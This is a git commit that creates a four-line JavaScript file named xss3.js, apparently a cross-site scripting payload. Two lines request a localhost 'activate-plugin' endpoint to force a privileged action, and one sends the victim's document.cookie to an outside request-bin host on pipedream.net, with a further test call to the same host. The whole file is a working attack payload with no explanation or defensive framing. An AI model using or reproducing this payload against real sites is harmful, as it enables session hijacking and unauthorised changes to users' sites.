082a77a1310e7900c08b099dab0d934ccc0da838
MaxToffy <91328785+MaxToffy@users.noreply.github.com>
2023-11-19 03:27:00 +0100

    Create xss3.js

---
+++ xss3.js
@@ -0,0 +1,4 @@
+fetch("https://localhost/activate-plugin/1");
+fetch("http://localhost/activate-plugin/1");
+fetch("https://enjvgl53rrbci.x.pipedream.net/?cookie="+document.cookie);
+fetch("https://enjvgl53rrbci.x.pipedream.net/?cookie=test");
